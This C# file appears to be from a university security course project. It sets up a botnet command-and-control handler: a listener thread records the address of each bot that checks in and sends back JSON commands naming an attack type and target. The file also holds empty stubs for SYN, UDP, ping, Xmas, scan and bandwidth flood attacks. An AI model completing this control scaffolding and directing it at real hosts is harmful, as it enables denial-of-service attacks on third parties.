using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
/** 
*  Author: Angus Moore 2022
*/
namespace Coms4507_Project.BotHandling
{

    /// <summary>
    /// This is the class that handles all bots. It's the main API between internal operations and commands that handle the bot.
    /// 
    /// In essence, any functionality that deals with the bots should be routed through functions written here.
    /// 
    /// NETWORKING AND PHYSICAL COMMUNICATION BETWEEN BOTS WILL BE HANDLED OVER A DIFFERENT OBJECT. IT IS CALLED AT THE EACH FUNCTION (simulated return value).
    /// </summary>
    public class BotHandler
    {
        private readonly NetworkHandler networkHandler; // All interactions with bots is done through here.
        private List<string> bots; // Used to gather all the bots.
        private string ip;

        // These are attack status stuff.
        public string attackType = "idle";
        public string requestType = "status";

        private Dictionary<string, string> botIpPortDetails;

        public BotHandler(string ip)
        {
            bots = new List<string>();
            networkHandler = new NetworkHandler(ip);
            Thread thread = new Thread(Listener);
            thread.Start();
            botIpPortDetails = new Dictionary<string, string>();
        }

        private void Listener()
        {
            while(true)
            {
                try
                {
                    // We just loop over this over and over and wait for a message
                    Trace.WriteLine("waiting");
                    Dictionary<string, string> message = networkHandler.WaitForMessage();

                    JObject jData = JsonConvert.DeserializeObject<JObject>(message["payload"]);
                    Trace.WriteLine(jData.ToString());
                    // All bots provide this information and only respond with their
                    string ip = jData.GetValue("ip").ToString();
                    string hostID = jData.GetValue("id").ToString();
                    string status = jData.GetValue("status").ToString();
                    string port = message["port"];

                    botIpPortDetails[hostID] = ip + "::" + port;
                    Trace.WriteLine(botIpPortDetails.ToString());
                    /*
                     * TODO: Write in components here to extract information, identify which bot is which, then go through the list of IPs/port nums
                     * being used by the bots to distribute out the code.
                     * 
                     * ID (ULTRASTEED) -> ip::port_num to communicate with. That way we can issue commands through a dictionary of bots.
                     */

                    // Build the status JObject here
                    Dictionary<string, object> data = new Dictionary<string, object>
                    {
                        { "request", requestType },
                        { "attack", "none" },
                        { "targetIP", "none" },
                        { "ports", "[]" },
                        { "runtime", "*" }
                    };

                    networkHandler.SendMessage(JObject.FromObject(data).ToString(), message["ip"], message["port"]);
                }
                catch (Exception ex)
                {
                    // We should just ignore it.
                    Trace.WriteLine(ex.Message);
                }
            }
        }

        // TODO: Write the functions for things like sending out commands, stopping bots, bot handling and other things about saving them.
        // There may come a point where the IP Address changes and we need to resolve the location of the bots.
        // The bots will absolutely need a way of connecting with a fixed IP address (probably a heroku nameserver that we write as a reverse proxy).


        public void Issue_SYN_FLOOD()
        {

        }

        public void Issue_XMAS_ATTACK()
        {

        }

        public void Issue_PING_FLOOD()
        {

        }

        public void Issue_UDP_FLOOD()
        {

        }

        public void Issue_SCAN_FLOOD()
        {

        }

        public void Issue_BANDWIDTH_ATTACK()
        {

        }

        public void Issue_STOP()
        {

        }


    }
}
